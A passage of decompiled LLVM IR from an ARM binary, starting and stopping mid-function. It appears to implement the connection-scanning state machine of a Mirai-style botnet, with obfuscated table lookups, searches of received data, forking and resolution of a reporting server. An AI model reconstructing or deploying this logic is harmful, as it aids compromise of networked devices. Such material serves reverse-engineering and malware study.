  %v2_f678 = icmp eq i32 %v3_f674, -1
  store i1 %v2_f678, i1* %cpsr_c.global-to-local, align 1
  %v7_f678 = icmp eq i32 %v3_f674, -1
  store i1 %v7_f678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f678, label %dec_label_pc_f7cc, label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f658
  %v3_f680 = udiv i32 %v3_f674, 32
  store i32 %v2_f5dc, i32* %r3.global-to-local, align 4
  %v3_f688 = mul nuw nsw i32 %v3_f680, 4
  store i32 %v3_f688, i32* @ip, align 4
  %v2_f68c = add i32 %v3_f688, %v2_f5dc
  store i32 %v2_f68c, i32* %r2.global-to-local, align 4
  %v1_f690 = add i32 %v2_f68c, -312
  %v2_f690 = inttoptr i32 %v1_f690 to i32*
  %v3_f690 = load i32, i32* %v2_f690, align 4
  %v1_f694 = urem i32 %v3_f674, 32
  store i32 %v1_f694, i32* %r1.global-to-local, align 4
  %v2_f698 = add nsw i32 %v1_f694, -1
  %v3_f698 = shl i32 1, %v2_f698
  %v4_f698 = and i32 %v3_f690, %v3_f698
  %v5_f698 = icmp ne i32 %v4_f698, 0
  store i1 %v5_f698, i1* %cpsr_c.global-to-local, align 1
  %v6_f698 = ashr i32 %v3_f690, %v1_f694
  store i32 %v6_f698, i32* %r3.global-to-local, align 4
  %v1_f69c = urem i32 %v6_f698, 2
  %v2_f69c = icmp eq i32 %v1_f69c, 0
  store i1 %v2_f69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f69c, label %dec_label_pc_f6a4, label %dec_label_pc_10218

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f680, %dec_label_pc_102bc
  %v1_f6b0 = phi i32 [ %v1_f694, %dec_label_pc_f680 ], [ %v1_f6b0.pre, %dec_label_pc_102bc ]
  %v0_f6a8 = phi i32 [ %v3_f688, %dec_label_pc_f680 ], [ %v0_f6a8.pre, %dec_label_pc_102bc ]
  store i32 %v2_f5dc, i32* @lr, align 4
  %v2_f6a8 = add i32 %v0_f6a8, %v2_f5dc
  store i32 %v2_f6a8, i32* %r2.global-to-local, align 4
  %v1_f6ac = add i32 %v2_f6a8, -184
  %v2_f6ac = inttoptr i32 %v1_f6ac to i32*
  %v3_f6ac = load i32, i32* %v2_f6ac, align 4
  %v2_f6b0 = add i32 %v1_f6b0, -1
  %v3_f6b0 = shl i32 1, %v2_f6b0
  %v4_f6b0 = and i32 %v3_f6ac, %v3_f6b0
  %v5_f6b0 = icmp ne i32 %v4_f6b0, 0
  store i1 %v5_f6b0, i1* %cpsr_c.global-to-local, align 1
  %v6_f6b0 = ashr i32 %v3_f6ac, %v1_f6b0
  store i32 %v6_f6b0, i32* %r3.global-to-local, align 4
  %v1_f6b4 = urem i32 %v6_f6b0, 2
  %v2_f6b4 = icmp eq i32 %v1_f6b4, 0
  store i1 %v2_f6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6b4, label %dec_label_pc_f7cc, label %dec_label_pc_f6bc.preheader

dec_label_pc_f6bc.preheader:                      ; preds = %dec_label_pc_f6a4
  %v0_f6bc182 = load i32, i32* @r6, align 4
  %v1_f6bc183 = add i32 %v0_f6bc182, 12
  %v2_f6bc184 = inttoptr i32 %v1_f6bc183 to i32*
  %v3_f6bc185 = load i32, i32* %v2_f6bc184, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6c0181187 = icmp eq i32 %v3_f6bc185, 0
  store i1 %v2_f6c0181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6c0181187, label %dec_label_pc_f7cc, label %dec_label_pc_f6c8.lr.ph

dec_label_pc_f6bc.loopexit:                       ; preds = %dec_label_pc_f81c, %dec_label_pc_f908
  %v0_f6bc = load i32, i32* @r6, align 4
  %v1_f6bc = add i32 %v0_f6bc, 12
  %v2_f6bc = inttoptr i32 %v1_f6bc to i32*
  %v3_f6bc = load i32, i32* %v2_f6bc, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6c0181 = icmp eq i32 %v3_f6bc, 0
  store i1 %v2_f6c0181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6c0181, label %dec_label_pc_f7cc, label %dec_label_pc_f6c8.lr.ph

dec_label_pc_f6c8.lr.ph:                          ; preds = %dec_label_pc_f6bc.preheader, %dec_label_pc_f6bc.loopexit
  %v0_f6c8231 = phi i32 [ %v0_f6bc, %dec_label_pc_f6bc.loopexit ], [ %v0_f6bc182, %dec_label_pc_f6bc.preheader ]
  br label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f6c0.backedge.thread, %dec_label_pc_f6c0.backedge, %dec_label_pc_f6c0.backedge.thread562, %dec_label_pc_f6c8.lr.ph
  %v0_101e4 = phi i32 [ %v0_f6c8231, %dec_label_pc_f6c8.lr.ph ], [ %v0_f6c8228, %dec_label_pc_f6c0.backedge ], [ %v0_f740, %dec_label_pc_f6c0.backedge.thread ], [ %v0_f740, %dec_label_pc_f6c0.backedge.thread562 ]
  %v1_f6c8 = add i32 %v0_101e4, 24
  %v2_f6c8 = inttoptr i32 %v1_f6c8 to i32*
  %v3_f6c8 = load i32, i32* %v2_f6c8, align 4
  store i32 %v3_f6c8, i32* @r3, align 4
  %v2_f6cc = icmp ugt i32 %v3_f6c8, 355
  store i1 %v2_f6cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6cc = icmp eq i32 %v3_f6c8, 356
  store i1 %v7_f6cc, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_101e4, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f6cc, label %dec_label_pc_101e4, label %dec_label_pc_f6d8

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6c8, %dec_label_pc_101e4
  store i32 %v0_f2dc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f2f8, align 4
  %v0_f6e4 = load i32, i32* @r6, align 4
  %v1_f6e4 = add i32 %v0_f6e4, 24
  %v2_f6e4 = inttoptr i32 %v1_f6e4 to i32*
  %v3_f6e4 = load i32, i32* %v2_f6e4, align 4
  store i32 %v3_f6e4, i32* %r2.global-to-local, align 4
  %v0_f6e8 = load i32, i32* @fp, align 4
  %v2_f6e8 = add i32 %v0_f6e8, %v3_f6e4
  store i32 %v2_f6e8, i32* @r4, align 4
  %v1_f6ec = add i32 %v0_f6e4, 4
  %v2_f6ec = inttoptr i32 %v1_f6ec to i32*
  %v3_f6ec = load i32, i32* %v2_f6ec, align 4
  %v1_f6f0 = sub i32 356, %v3_f6e4
  store i32 %v1_f6f0, i32* %r2.global-to-local, align 4
  store i32 %v2_f6e8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f6fc = call i32 @__libc_recv(i32 %v3_f6ec, i32 %v2_f6e8, i32 %v1_f6f0, i32 16384)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f700 = icmp eq i32 %v4_f6fc, 0
  store i1 %v2_f700, i1* %cpsr_z.global-to-local, align 1
  %tmp417 = icmp slt i32 %v4_f6fc, 1
  br i1 %tmp417, label %dec_label_pc_f778, label %dec_label_pc_f708

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6d8
  %v0_f708 = load i32, i32* @r5, align 4
  store i32 %v0_f708, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %.thread83, %dec_label_pc_f708
  %v3_f718 = phi i32 [ %v1_f71c, %.thread83 ], [ %v0_f708, %dec_label_pc_f708 ]
  %v1_f70c = load i32, i32* @r4, align 4
  %v2_f70c = add i32 %v1_f70c, %v3_f718
  %v3_f70c = inttoptr i32 %v2_f70c to i8*
  %v4_f70c = load i8, i8* %v3_f70c, align 1
  %v6_f70c = zext i8 %v4_f70c to i32
  store i32 %v6_f70c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f710 = icmp eq i8 %v4_f70c, 0
  store i1 %v2_f710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f710, label %bb418, label %.thread83

bb418:                                            ; preds = %dec_label_pc_f70c
  %v2_f714 = add nuw nsw i32 %v6_f70c, 65
  store i32 %v2_f714, i32* %r3.global-to-local, align 4
  %v2_f718 = trunc i32 %v2_f714 to i8
  store i8 %v2_f718, i8* %v3_f70c, align 1
  %v0_f71c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread83

.thread83:                                        ; preds = %dec_label_pc_f70c, %bb418
  %v0_f71c = phi i32 [ %v3_f718, %dec_label_pc_f70c ], [ %v0_f71c.pre, %bb418 ]
  %v1_f71c = add i32 %v0_f71c, 1
  store i32 %v1_f71c, i32* %r2.global-to-local, align 4
  %v3_f720 = icmp uge i32 %v1_f71c, %v4_f6fc
  store i1 %v3_f720, i1* %cpsr_c.global-to-local, align 1
  %v9_f720 = icmp eq i32 %v1_f71c, %v4_f6fc
  store i1 %v9_f720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f720, label %dec_label_pc_f728, label %dec_label_pc_f70c

dec_label_pc_f728:                                ; preds = %.thread83, %dec_label_pc_f77c
  store i32 ptrtoint (i32* @global_var_22478.143 to i32), i32* @lr, align 4
  %v0_f72c = load i32, i32* @r6, align 4
  %v1_f72c = add i32 %v0_f72c, 24
  %v2_f72c = inttoptr i32 %v1_f72c to i32*
  %v3_f72c = load i32, i32* %v2_f72c, align 4
  %v2_f730 = load i32, i32* @global_var_22478.143, align 4
  store i32 %v2_f730, i32* %r2.global-to-local, align 4
  %v2_f734 = add i32 %v3_f72c, %v4_f6fc
  store i32 %v2_f734, i32* %r3.global-to-local, align 4
  store i32 %v2_f734, i32* %v2_f72c, align 4
  %v0_f73c = load i32, i32* %r2.global-to-local, align 4
  %v1_f73c = load i32, i32* @r6, align 4
  %v2_f73c = add i32 %v1_f73c, 8
  %v3_f73c = inttoptr i32 %v2_f73c to i32*
  store i32 %v0_f73c, i32* %v3_f73c, align 4
  br label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f910, %dec_label_pc_f728
  %v0_f740 = load i32, i32* @r6, align 4
  %v1_f740 = add i32 %v0_f740, 12
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  %v3_f740 = load i32, i32* %v2_f740, align 4
  %v1_f744 = add i32 %v3_f740, -2
  store i32 %v1_f744, i32* @r3, align 4
  %v7_f748 = icmp eq i32 %v1_f744, 8
  store i1 %v7_f748, i1* %cpsr_z.global-to-local, align 1
  %v5_f74c = and i32 %v1_f744, 1073741824
  %v6_f74c = icmp ne i32 %v5_f74c, 0
  store i1 %v6_f74c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f740, label %dec_label_pc_f6c0.backedge [
    i32 2, label %dec_label_pc_fa0c
    i32 3, label %dec_label_pc_ff8c
    i32 4, label %dec_label_pc_fdcc
    i32 5, label %dec_label_pc_fbb0
    i32 6, label %dec_label_pc_fadc
    i32 7, label %dec_label_pc_feb8
    i32 8, label %dec_label_pc_fc84
    i32 9, label %dec_label_pc_f938
    i32 10, label %dec_label_pc_f7e4
  ]

dec_label_pc_f778:                                ; preds = %dec_label_pc_f6d8
  br i1 %v2_f700, label %dec_label_pc_10448, label %dec_label_pc_f77c

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f778
  %v3_f77c = icmp eq i32 %v4_f6fc, -1
  store i1 %v3_f77c, i1* %cpsr_c.global-to-local, align 1
  %v8_f77c = icmp eq i32 %v4_f6fc, -1
  store i1 %v8_f77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f77c, label %dec_label_pc_f784, label %dec_label_pc_f728

dec_label_pc_f784:                                ; preds = %dec_label_pc_f77c
  store i32 %v0_f2dc, i32* %ip.global-to-local, align 4
  %v2_f788 = load i32, i32* %v2_f2f8, align 4
  store i32 %v2_f788, i32* %r3.global-to-local, align 4
  %v2_f78c = icmp ugt i32 %v2_f788, 10
  store i1 %v2_f78c, i1* %cpsr_c.global-to-local, align 1
  %v7_f78c = icmp eq i32 %v2_f788, 11
  store i1 %v7_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f78c, label %dec_label_pc_f7cc, label %dec_label_pc_f794

dec_label_pc_f794:                                ; preds = %dec_label_pc_f784, %dec_label_pc_10448
  %v0_f794 = load i32, i32* @r6, align 4
  %v1_f794 = add i32 %v0_f794, 4
  %v2_f794 = inttoptr i32 %v1_f794 to i32*
  %v3_f794 = load i32, i32* %v2_f794, align 4
  %v1_f798 = call i32 @__GI___libc_close(i32 %v3_f794)
  %v0_f79c = load i32, i32* @r6, align 4
  %v1_f79c = add i32 %v0_f79c, 384
  %v2_f79c = inttoptr i32 %v1_f79c to i8*
  %v3_f79c = load i8, i8* %v2_f79c, align 1
  %v4_f79c = zext i8 %v3_f79c to i32
  %v1_f7a0 = add nuw nsw i32 %v4_f79c, 1
  %v1_f7a4 = urem i32 %v1_f7a0, 256
  store i32 %v1_f7a4, i32* %r3.global-to-local, align 4
  %v2_f7a8 = icmp ugt i32 %v1_f7a4, 8
  store i1 %v2_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a8 = icmp eq i32 %v1_f7a4, 9
  store i1 %v7_f7a8, i1* %cpsr_z.global-to-local, align 1
  %v1_f7ac = trunc i32 %v1_f7a0 to i8
  store i8 %v1_f7ac, i8* %v2_f79c, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f7b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f7b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f7b4 = xor i1 %v1_f7b4, true
  %v3_f7b4 = and i1 %v0_f7b4, %v2_f7b4
  br i1 %v3_f7b4, label %bb419, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f794
  %v1_f7b8308313 = load i32, i32* @r6, align 4
  %v2_f7b8309314 = add i32 %v1_f7b8308313, 4
  %v3_f7b8310315 = inttoptr i32 %v2_f7b8309314 to i32*
  store i32 -1, i32* %v3_f7b8310315, align 4
  br label %bb420

bb419:                                            ; preds = %dec_label_pc_f794
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f7b8304 = load i32, i32* @r6, align 4
  %v2_f7b8305 = add i32 %v1_f7b8304, 4
  %v3_f7b8306 = inttoptr i32 %v2_f7b8305 to i32*
  store i32 -1, i32* %v3_f7b8306, align 4
  %v4_f7bc = load i32, i32* %r3.global-to-local, align 4
  %v5_f7bc = load i32, i32* @r6, align 4
  %v6_f7bc = add i32 %v5_f7bc, 12
  %v7_f7bc = inttoptr i32 %v6_f7bc to i32*
  store i32 %v4_f7bc, i32* %v7_f7bc, align 4
  %v4_f7c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_f7c0 = trunc i32 %v4_f7c0 to i8
  %v6_f7c0 = load i32, i32* @r6, align 4
  %v7_f7c0 = add i32 %v6_f7c0, 384
  %v8_f7c0 = inttoptr i32 %v7_f7c0 to i8*
  store i8 %v5_f7c0, i8* %v8_f7c0, align 1
  %v0_f7c4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f7c4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb420

bb420:                                            ; preds = %.thread312, %bb419
  %v1_f7c8 = phi i1 [ %v1_f7c4.pre, %bb419 ], [ %v0_f7b4, %.thread312 ]
  %v0_f7c8 = phi i1 [ %v0_f7c4.pre, %bb419 ], [ %v1_f7b4, %.thread312 ]
  %v2_f7c4 = xor i1 %v1_f7c8, true
  %v3_f7c4 = or i1 %v0_f7c8, %v2_f7c4
  br i1 %v3_f7c4, label %bb421, label %bb422

bb421:                                            ; preds = %bb420
  br label %bb422

bb422:                                            ; preds = %bb420, %bb421
  store i32 63436, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f7c4, i32 ptrtoint (i32* @global_var_eaa8.206 to i32))
  br label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f6bc.loopexit, %dec_label_pc_f6c0.backedge, %dec_label_pc_f6bc.preheader, %dec_label_pc_f784, %dec_label_pc_f6a4, %dec_label_pc_f658, %dec_label_pc_102dc, %bb422
  %v3_f7cc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f7cc, i32* %r3.global-to-local, align 4
  %v1_f7d0 = add i32 %v3_f7cc, 1
  store i32 %v1_f7d0, i32* @r4, align 4
  %v3_f7d4 = icmp ugt i32 %v1_f7d0, 355
  store i1 %v3_f7d4, i1* %cpsr_c.global-to-local, align 1
  %v8_f7d4 = icmp eq i32 %v1_f7d0, 356
  store i1 %v8_f7d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f7d0, i32* %stack_var_-52, align 4
  %v5_f7dc = icmp slt i32 %v1_f7d0, 356
  br i1 %v5_f7dc, label %dec_label_pc_f658, label %dec_label_pc_efc8

dec_label_pc_f7e4:                                ; preds = %dec_label_pc_f740
  %v1_f7e8 = call i32 @table_unlock_val(i32 12)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_f7f8 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f7fc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f7f8, i32* %r2.global-to-local, align 4
  %v1_f804 = add i32 %v3_f7fc, -1
  store i32 %v1_f804, i32* %r3.global-to-local, align 4
  %v0_f808 = load i32, i32* @fp, align 4
  %v0_f80c = load i32, i32* @r6, align 4
  %v1_f80c = add i32 %v0_f80c, 24
  %v2_f80c = inttoptr i32 %v1_f80c to i32*
  %v3_f80c = load i32, i32* %v2_f80c, align 4
  store i32 %v3_f80c, i32* %r1.global-to-local, align 4
  %v4_f810 = call i32 @util_memsearch(i32 %v0_f808, i32 %v3_f80c, i32 %v3_f7f8, i32 %v1_f804)
  %v3_f814 = icmp eq i32 %v4_f810, -1
  store i1 %v3_f814, i1* %cpsr_c.global-to-local, align 1
  %v8_f814 = icmp eq i32 %v4_f810, -1
  store i1 %v8_f814, i1* %cpsr_z.global-to-local, align 1
  %v1_f820 = call i32 @table_lock_val(i32 12)
  br i1 %v3_f814, label %dec_label_pc_f81c, label %dec_label_pc_1017c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f7e4
  %v1_f828 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_f838 = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  %v3_f83c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f838, i32* %r2.global-to-local, align 4
  %v1_f844 = add i32 %v3_f83c, -1
  store i32 %v1_f844, i32* %r3.global-to-local, align 4
  %v0_f848 = load i32, i32* @r6, align 4
  %v1_f848 = add i32 %v0_f848, 24
  %v2_f848 = inttoptr i32 %v1_f848 to i32*
  %v3_f848 = load i32, i32* %v2_f848, align 4
  store i32 %v3_f848, i32* %r1.global-to-local, align 4
  %v0_f84c = load i32, i32* @fp, align 4
  %v4_f850 = call i32 @util_memsearch(i32 %v0_f84c, i32 %v3_f848, i32 %v3_f838, i32 %v1_f844)
  store i32 %v4_f850, i32* @r7, align 4
  %v1_f85c = call i32 @table_lock_val(i32 11)
  %v0_f860 = load i32, i32* @r7, align 4
  %v2_f860 = icmp eq i32 %v0_f860, -1
  store i1 %v2_f860, i1* %cpsr_c.global-to-local, align 1
  %v7_f860 = icmp eq i32 %v0_f860, -1
  store i1 %v7_f860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f860, label %dec_label_pc_f6bc.loopexit, label %dec_label_pc_f868

dec_label_pc_f868:                                ; preds = %dec_label_pc_f81c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f868 = icmp eq i32 %v0_f860, 0
  store i1 %v2_f868, i1* %cpsr_z.global-to-local, align 1
  %tmp423 = icmp slt i32 %v0_f860, 1
  br i1 %tmp423, label %dec_label_pc_f908, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %dec_label_pc_f868
  %v0_f870 = load i32, i32* @r6, align 4
  %v1_f870 = add i32 %v0_f870, 20
  %v2_f870 = inttoptr i32 %v1_f870 to i16*
  %v3_f870 = load i16, i16* %v2_f870, align 2
  %v4_f870 = zext i16 %v3_f870 to i32
  store i32 %v4_f870, i32* %r3.global-to-local, align 4
  %v1_f874 = add i32 %v0_f870, 16
  %v2_f874 = inttoptr i32 %v1_f874 to i32*
  %v3_f874 = load i32, i32* %v2_f874, align 4
  store i32 %v3_f874, i32* %r2.global-to-local, align 4
  store i32 %v2_f878, i32* %r1.global-to-local, align 4
  store i32 %v4_f870, i32* %stack_var_-42, align 4
  store i32 %v3_f874, i32* %stack_var_-60, align 4
  %v1_f884 = inttoptr i32 %v0_f870 to i32*
  %v2_f884 = load i32, i32* %v1_f884, align 4
  store i32 %v2_f884, i32* @sb, align 4
  %v0_f888 = call i32 @__libc_fork()
  %v7_f88c = icmp eq i32 %v0_f888, -1
  %.462 = zext i1 %v7_f88c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f898 = icmp eq i32 %v0_f888, 0
  store i1 %v2_f898, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp slt i32 %v0_f888, 1
  br i1 %tmp426, label %bb427, label %.thread86

.thread86:                                        ; preds = %dec_label_pc_f870
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f8f0

bb427:                                            ; preds = %dec_label_pc_f870
  store i32 %.462, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8a4 = icmp eq i1 %v7_f88c, false
  store i1 %v2_f8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8a4, label %dec_label_pc_f8ac, label %dec_label_pc_f8f0

dec_label_pc_f8ac:                                ; preds = %bb427
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f8b8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_f8bc = icmp eq i32 %v3_f8b8, -1
  store i1 %v2_f8bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8bc = icmp eq i32 %v3_f8b8, -1
  store i1 %v7_f8bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f8b8, i32* @r8, align 4
  br i1 %v7_f8bc, label %dec_label_pc_10418, label %dec_label_pc_f8c8

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f8ac
  %v1_f8cc = call i32 @table_unlock_val(i32 3)
  %v1_f8d4 = call i32 @table_unlock_val(i32 4)
  %v0_f8d8 = load i32, i32* @sl, align 4
  store i32 %v0_f8d8, i32* %r1.global-to-local, align 4
  %v2_f8e0 = inttoptr i32 %v0_f8d8 to i32*
  %v3_f8e0 = call i32 @table_retrieve_val(i32 3, i32* %v2_f8e0)
  %v1_f8e4 = call i32 @resolv_lookup(i32 %v3_f8e0)
  store i32 %v1_f8e4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f8e8 = icmp eq i32 %v1_f8e4, 0
  store i1 %v3_f8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f8e8, label %dec_label_pc_f8f0, label %dec_label_pc_102f8

dec_label_pc_f8f0:                                ; preds = %.thread86, %dec_label_pc_f8c8, %bb427
  %v0_f8f0 = load i32, i32* @r6, align 4
  %v1_f8f0 = add i32 %v0_f8f0, 4
  %v2_f8f0 = inttoptr i32 %v1_f8f0 to i32*
  %v3_f8f0 = load i32, i32* %v2_f8f0, align 4
  %v1_f8f4 = call i32 @__GI___libc_close(i32 %v3_f8f0)
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f900 = load i32, i32* @r6, align 4
  %v2_f900 = add i32 %v1_f900, 4
  %v3_f900 = inttoptr i32 %v2_f900 to i32*
  store i32 -1, i32* %v3_f900, align 4
  %v0_f904 = load i32, i32* %r2.global-to-local, align 4
  %v1_f904 = load i32, i32* @r6, align 4
  %v2_f904 = add i32 %v1_f904, 12
  %v3_f904 = inttoptr i32 %v2_f904 to i32*
  store i32 %v0_f904, i32* %v3_f904, align 4
  br label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %dec_label_pc_facc, %bb436, %dec_label_pc_10090, %dec_label_pc_f868, %dec_label_pc_10134, %dec_label_pc_fe80, %dec_label_pc_f8f0
  %v0_f908 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f908 = icmp eq i32 %v0_f908, 0
  store i1 %v2_f908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f908, label %dec_label_pc_f6bc.loopexit, label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %dec_label_pc_f908, %dec_label_pc_ff34, %dec_label_pc_fd74, %dec_label_pc_fc2c, %dec_label_pc_fb58, %dec_label_pc_f9b4, %dec_label_pc_10208, %dec_label_pc_101ac
  %v0_f910 = load i32, i32* @r6, align 4
  %v1_f910 = add i32 %v0_f910, 24
  %v2_f910 = inttoptr i32 %v1_f910 to i32*
  %v3_f910 = load i32, i32* %v2_f910, align 4
  %v0_f914 = load i32, i32* @r7, align 4
  %v2_f914 = sub i32 %v0_f914, %v3_f910
  %v3_f914 = icmp uge i32 %v0_f914, %v3_f910
  store i1 %v3_f914, i1* %cpsr_c.global-to-local, align 1
  %v4_f914 = xor i32 %v0_f914, %v3_f910
  %v5_f914 = xor i32 %v2_f914, %v0_f914
  %v6_f914 = and i32 %v5_f914, %v4_f914
  %v7_f914 = icmp slt i32 %v6_f914, 0
  %v8_f914 = icmp slt i32 %v2_f914, 0
  %v9_f914 = icmp eq i32 %v0_f914, %v3_f910
  store i1 %v9_f914, i1* %cpsr_z.global-to-local, align 1
  %v2_f918 = xor i1 %v8_f914, %v7_f914
  %v0_f914.v3_f910 = select i1 %v2_f918, i32 %v0_f914, i32 %v3_f910
  store i32 %v0_f914.v3_f910, i32* %r1.global-to-local, align 4
  %v2_f920 = sub i32 %v3_f910, %v0_f914.v3_f910
  store i32 %v2_f920, i32* @r2, align 4
  store i32 %v2_f920, i32* %v2_f910, align 4
  %v0_f928 = load i32, i32* @fp, align 4
  %v1_f928 = load i32, i32* %r1.global-to-local, align 4
  %v2_f928 = add i32 %v1_f928, %v0_f928
  store i32 %v2_f928, i32* @r1, align 4
  store i32 %v0_f928, i32* @r0, align 4
  %v3_f930 = call i32 @memmove(i32 %v0_f928, i32 %v2_f928, i32 %v2_f920)
  br label %dec_label_pc_f740

dec_label_pc_f938:                                ; preds = %dec_label_pc_f740
  %v1_f938 = add i32 %v0_f740, 24
  %v2_f938 = inttoptr i32 %v1_f938 to i32*
  %v3_f938 = load i32, i32* %v2_f938, align 4
  store i32 %v3_f938, i32* %r2.global-to-local, align 4
  %v1_f93c = add i32 %v3_f938, -1
  store i32 %v1_f93c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f940 = icmp eq i32 %v1_f93c, 0
  store i1 %v2_f940, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f93c, 1
  br i1 %tmp430, label %dec_label_pc_f6c0.backedge.thread, label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %dec_label_pc_f938
  %v2_f948 = add i32 %v1_f93c, %v0_f740
  store i32 %v2_f948, i32* %r3.global-to-local, align 4
  %v1_f94c = add i32 %v2_f948, 28
  %v2_f94c = inttoptr i32 %v1_f94c to i8*
  %v3_f94c = load i8, i8* %v2_f94c, align 1
  %v4_f94c = zext i8 %v3_f94c to i32
  store i32 %v4_f94c, i32* %r3.global-to-local, align 4
  %v2_f950 = icmp ugt i8 %v3_f94c, 61
  store i1 %v2_f950, i1* %cpsr_c.global-to-local, align 1
  %v7_f950 = icmp eq i8 %v3_f94c, 62
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f950, label %dec_label_pc_f9b4, label %bb431

bb431:                                            ; preds = %dec_label_pc_f948
  %v3_f954 = icmp ugt i8 %v3_f94c, 57
  store i1 %v3_f954, i1* %cpsr_c.global-to-local, align 1
  %v8_f954 = icmp eq i8 %v3_f94c, 58
  store i1 %v8_f954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f954, label %dec_label_pc_f9b4, label %dec_label_pc_f95c

dec_label_pc_f95c:                                ; preds = %bb431
  %v2_f95c = icmp ugt i8 %v3_f94c, 35
  store i1 %v2_f95c, i1* %cpsr_c.global-to-local, align 1
  %v7_f95c = icmp eq i8 %v3_f94c, 36
  store i1 %v7_f95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f95c, label %dec_label_pc_f9b4, label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %dec_label_pc_f95c
  %v2_f964 = icmp ugt i8 %v3_f94c, 34
  store i1 %v2_f964, i1* %cpsr_c.global-to-local, align 1
  %v7_f964 = icmp eq i8 %v3_f94c, 35
  store i1 %v7_f964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f964, label %dec_label_pc_f9b4, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f964
  %v2_f96c = icmp ugt i8 %v3_f94c, 36
  store i1 %v2_f96c, i1* %cpsr_c.global-to-local, align 1
  %v7_f96c = icmp eq i8 %v3_f94c, 37
  store i1 %v7_f96c, i1* %cpsr_z.global-to-local, align 1
